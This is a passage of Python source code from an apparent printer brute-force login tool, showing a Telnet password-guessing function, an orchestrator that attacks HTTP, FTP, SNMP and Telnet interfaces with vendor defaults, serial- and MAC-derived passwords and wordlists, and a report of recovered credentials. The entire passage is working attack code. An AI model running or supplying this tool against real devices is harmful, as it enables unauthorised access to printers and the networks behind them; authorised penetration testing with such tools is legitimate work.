) -> List[LoginResult]:
    """Telnet brute force against printer management interface."""
    results: List[LoginResult] = []

    # Check if Telnet is open
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        banner = b''
        s.settimeout(2)
        try:
            banner = s.recv(256)
        except Exception:
            pass
        s.close()
    except Exception:
        return results   # Telnet not open

    if verbose:
        print(f"\n  {_CYN}[TELNET BF]{_RST} {host}:{port} | vendor={vendor}")

    for username, password in iter_credentials(
        vendor, serial, mac, 'telnet', enable_variations, extra_creds, wordlist_path
    ):
        pwd_display = password if password is not None else '(blank)'
        if verbose:
            print(f"  {_DIM}» {username!r:<14} / {pwd_display!r}{_RST}", end='\r')

        try:
            import telnetlib
            tn = telnetlib.Telnet(host, port, timeout=timeout)
            tn.read_until(b'login:', timeout=timeout)
            tn.write((username + '\n').encode('ascii'))
            tn.read_until(b'Password:', timeout=timeout)
            tn.write(((password or '') + '\n').encode('ascii'))
            time.sleep(1)
            out = tn.read_very_eager().decode('latin-1', errors='replace')
            tn.close()

            if any(kw in out.lower() for kw in ('$', '#', '%', '>', 'welcome', 'hp', 'kyocera')):
                result = LoginResult(
                    protocol = 'telnet',
                    host     = host,
                    port     = port,
                    username = username,
                    password = password,
                    success  = True,
                    status   = 'found',
                    evidence = f'Shell prompt after login: {out[:60]}',
                )
                results.append(result)
                print(f"\n  {_GRN}[+] FOUND:{_RST} TELNET {host}:{port} "
                      f"→ {username!r} / {pwd_display!r}")
                if stop_on_first:
                    break
            else:
                results.append(LoginResult('telnet', host, port, username, password,
                                           False, 'invalid'))
        except Exception:
            results.append(LoginResult('telnet', host, port, username, password,
                                       False, 'timeout'))

        time.sleep(delay)

    return results


# ── Main orchestrator ─────────────────────────────────────────────────────────

def bruteforce(
    host:              str,
    vendor:            str = 'generic',
    serial:            str = '',
    mac:               str = '',
    open_ports:        List[int] = None,
    timeout:           float = DEFAULT_TIMEOUT,
    delay:             float = DEFAULT_DELAY,
    enable_variations: bool = True,
    stop_on_first:     bool = True,
    extra_creds:       List[Tuple[str, Optional[str]]] = None,
    wordlist_path:     Optional[str] = None,
    test_http:         bool = True,
    test_ftp:          bool = True,
    test_snmp:         bool = True,
    test_telnet:       bool = True,
    verbose:           bool = True,
) -> BruteforceReport:
    """
    Run brute-force login campaign against a printer target.

    Args:
        host:               Target IP or hostname.
        vendor:             Printer vendor/make (e.g. 'epson', 'hp', 'ricoh').
        serial:             Device serial number (used for __SERIAL__ token).
        mac:                MAC address string (used for __MAC6__ / __MAC12__ tokens).
        open_ports:         List of known open ports (to skip probing closed ports).
        timeout:            Socket/HTTP timeout in seconds.
        delay:              Delay between attempts (seconds) to avoid lockouts.
        enable_variations:  Generate password variations (reverse, leet, etc.)
        stop_on_first:      Stop each protocol BF after first successful credential.
        extra_creds:        Additional (username, password) pairs to test.
        test_http/ftp/snmp/telnet: Which protocols to test.
        verbose:            Print attempt progress.

    Returns:
        BruteforceReport with all results and found credentials.
    """
    ports = set(open_ports or [])
    report = BruteforceReport(host=host, vendor=vendor, serial=serial)

    # Resolve wordlist to use
    effective_wordlist = wordlist_path or get_default_wordlist_path()

    if verbose:
        print(f"\n  {'='*60}")
        print(f"  {_CYN}BRUTE FORCE LOGIN — {host}{_RST}")
        print(f"  {'='*60}")
        print(f"  Vendor    : {vendor or 'generic'}")
        print(f"  Serial    : {serial or '(not provided)'}")
        print(f"  MAC       : {mac or '(not provided)'}")
        print(f"  Wordlist  : {effective_wordlist or '(not found — check wordlists/ folder)'}")
        print(f"  Variations: {'YES' if enable_variations else 'NO'}")
        print()

    from utils.ports import PortConfig as _PC
    _http_port    = _PC.resolve('http')
    _https_port   = _PC.resolve('https')
    _ftp_port     = _PC.resolve('ftp')
    _snmp_port    = _PC.resolve('snmp')
    _telnet_port  = _PC.resolve('telnet')

    all_results: List[LoginResult] = []

    # ── HTTP
    _http_candidates = [
        (_http_port,  'http'),
        (_https_port, 'https'),
        (8080, 'http'),
        (8443, 'https'),
    ]
    if test_http and (not ports or any(p in ports for p, _ in _http_candidates)):
        for port, scheme in _http_candidates:
            if ports and port not in ports:
                continue
            r = bruteforce_http(
                host, port, vendor, serial, mac, scheme,
                timeout, delay, enable_variations, stop_on_first, extra_creds,
                effective_wordlist, verbose,
            )
            all_results.extend(r)
            if stop_on_first and any(x.success for x in r):
                break

    # ── FTP
    if test_ftp and (not ports or _ftp_port in ports):
        r = bruteforce_ftp(
            host, _ftp_port, vendor, serial, mac,
            timeout, delay, enable_variations, stop_on_first, extra_creds,
            effective_wordlist, verbose,
        )
        all_results.extend(r)

    # ── SNMP (always try unless explicitly excluded)
    if test_snmp and (True):
        r = bruteforce_snmp(
            host, _snmp_port, vendor, serial, mac,
            timeout, enable_variations, stop_on_first=False, extra_creds=extra_creds,
            wordlist_path=effective_wordlist, verbose=verbose,
        )
        all_results.extend(r)

    # ── Telnet
    if test_telnet and (not ports or _telnet_port in ports):
        r = bruteforce_telnet(
            host, _telnet_port, vendor, serial, mac,
            timeout, delay, enable_variations, stop_on_first, extra_creds,
            effective_wordlist, verbose,
        )
        all_results.extend(r)

    report.all_results = all_results
    report.total       = len(all_results)
    report.found       = [r for r in all_results if r.success]

    return report


# ── Output ────────────────────────────────────────────────────────────────────

def print_report(report: BruteforceReport) -> None:
    """Print brute-force report to stdout."""
    print(f"\n  {'='*60}")
    print(f"  {_CYN}BRUTE FORCE REPORT — {report.host}{_RST}")
    print(f"  {'='*60}")
    print(f"  Total attempts : {report.total}")
    print(f"  Found          : {len(report.found)}")

    if report.found:
        print(f"\n  {_GRN}{'[+] CREDENTIALS FOUND':}")
        print(f"  {'-'*60}{_RST}")
        for r in report.found:
            print(f"  {_GRN}[{r.protocol.upper()}]{_RST} "
                  f"{r.username!r:<14} / {r.password_display()!r:<24}")
            if r.evidence:
                print(f"         {_DIM}{r.evidence[:72]}{_RST}")
            if r.url:
                print(f"         {_DIM}{r.url}{_RST}")
    else:
        print(f"\n  {_DIM}No credentials found. "
              f"Device may have non-default credentials.{_RST}")
        print("  If serial number was not provided, try --bf-serial <SERIAL>")

    print()
